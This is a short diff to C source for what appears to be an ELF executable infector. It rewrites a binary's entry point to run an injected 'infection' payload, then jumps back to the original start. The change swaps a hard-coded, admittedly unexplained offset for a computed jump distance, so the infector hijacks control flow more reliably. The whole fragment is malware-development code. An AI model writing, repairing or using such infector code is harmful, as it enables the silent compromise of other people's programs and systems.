@@ -127,8 +127,13 @@ int main(int argc, char *argv[])
     if (!ptr)
         bail(filename, "Could not find dummy jump point");
 
-    /* I don't know why 244 is needed. */
-    Elf64_Word new_entry = (Elf64_Word)ehdr->e_entry - (pos + sizeof infection) + 244;
+    /* Calculate the jmp distance */
+    unsigned long jmpdist = ((unsigned long)infection + sizeof(infection));
+    jmpdist -= (unsigned long)ptr;
+    jmpdist -= 5;
+
+    /* Need to add the distance between the jump instruction and _start - xrx */
+    Elf64_Word new_entry = (Elf64_Word)ehdr->e_entry - (pos + sizeof infection) + jmpdist;
     memcpy(ptr + 1, &new_entry, sizeof(new_entry));
     ehdr->e_entry = pos;
 
